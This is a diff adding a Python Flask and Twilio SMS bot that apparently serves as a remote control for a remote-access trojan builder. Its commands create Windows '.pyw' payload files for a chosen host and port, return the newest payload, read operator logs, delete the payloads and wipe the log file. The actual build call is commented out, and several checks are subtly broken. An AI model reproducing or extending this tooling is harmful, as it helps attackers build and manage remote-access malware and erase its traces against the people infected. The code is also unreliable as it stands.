@@ -1,0 +1,146 @@
+#!/bin/env python
+
+import glob
+import os
+import urllib
+from twilio.rest import Client
+from flask import Flask, request
+# from client import MakeOutput
+from random import choice
+from string import ascii_uppercase, ascii_lowercase, digits
+
+
+# Twilio credentials
+account_sid = 'YOUR_TWILIO_ACCOUNT_SID'
+auth_token = 'YOUR_TWILIO_AUTH_TOKEN'
+twilio_phone_number = 'YOUR_TWILIO_PHONE_NUMBER'
+
+client = Client(account_sid, auth_token)
+
+app = Flask(__name__)
+
+
+@app.route("/sms", methods=['POST'])
+def sms():
+    message_body = request.form['Body']
+    from_number = request.form['From']
+    response = process_command(message_body, from_number)
+    send_sms(from_number, response)
+    return '', 200
+
+
+def process_command(message, phone_number):
+    if message.lower() == 'hello':
+        return 'Hello, my friend!'
+    elif message.lower() == 'ssh':
+        return generate_ssh_command()
+    elif message.lower().startswith('generate'):
+        args = message.split()
+        if len(args) < 4:
+            return "Usage: generate host port [name]"
+        host = args[1]
+        port = args[2]
+        name = args[3] if len(args) > 3 else None
+        return generate_server(host, port, name)
+    elif message.lower() == 'get_server':
+        return get_newest_server()
+    elif message.lower() == 'get_logs':
+        return get_logs()
+    elif message.lower() == 'clean_servers':
+        return clean_servers()
+    elif message.lower() == 'clean_logs':
+        return clean_logs()
+    else:
+        return 'Unknown command'
+
+
+def send_sms(to_number, message):
+    client.messages.create(
+        body=message,
+        from_=twilio_phone_number,
+        to=to_number
+    )
+
+
+def generate_ssh_command():
+    user = os.getlogin()
+    ex_ip_grab = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me', 'ipecho.net/plain', 'myexternalip.com/raw']
+    ip = ''
+    for url in ex_ip_grab:
+        try:
+            ip = urllib.request.urlopen('http://' + url).read().decode().rstrip()
+        except IOError:
+            pass
+        if ip and (6 < len(ip) < 16):
+            break
+    port = 22
+    return f'ssh -p {port} {user}@{ip}'
+
+
+def generate_server(host, port, name=None):
+    if not name:
+        random_string = ''.join(choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(6))
+        output = f"Parat-x86_{random_string}.pyw"
+    else:
+        file_type = name.split('.')[-1:]
+        file_name = '.'.join(name.split('.')[:-1])
+
+        if file_type not in ['py', 'pyw']:
+            file_name = name
+
+        if file_type and not file_name:
+            file_name = "".join(file_type)
+            file_type = "py"
+
+        if file_type != "pyw":
+            name = '.'.join([file_name, "pyw"])
+        output = name
+
+    path = os.path.abspath('')
+    # MakeOutput(output, host, port, plat, arch, None, path)
+    msg = f"`{output}` Created:\n"
+    msg += f"  host: `{host}`\n"
+    msg += f"  port: `{port}`\n"
+    msg += f"  platform: `windows`\n"
+    msg += f"  arch: `x86`\n"
+    return msg
+
+
+def get_newest_server():
+    newest_server = max(glob.iglob('parat_output/*.[Pp][Yy][Ww]'), key=os.path.getctime)
+    with open(newest_server, 'rb') as server_file:
+        return server_file.read()
+
+
+def get_logs():
+    os.chdir(os.path.join('conf', 'logs'))
+    try:
+        today_log = max(glob.iglob('*.log'), key=os.path.getctime)
+        with open(today_log, 'rb') as log_file:
+            return log_file.read()
+    except Exception as e:
+        if "max() arg is an empty sequence" in str(e):
+            return "No log found today!"
+        else:
+            return str(e)
+    os.chdir(os.path.join('../..'))
+
+
+def clean_servers():
+    names = []
+    for server_file in glob.glob("*.[Pp][Yy][Ww]"):
+        names.append(server_file)
+        os.remove(server_file)
+    if len(names) > 0:
+        return f'All file(s) deleted successfully:\n{", ".join(names)}'
+
+
+def clean_logs():
+    PathToLogFile = os.path.join('conf', 'logs', 'parat.log')
+    with open(PathToLogFile, "w") as rlog:
+        pass
+    return 'All logs deleted successfully.'
+
+
+if __name__ == "__main__":
+    app.run()
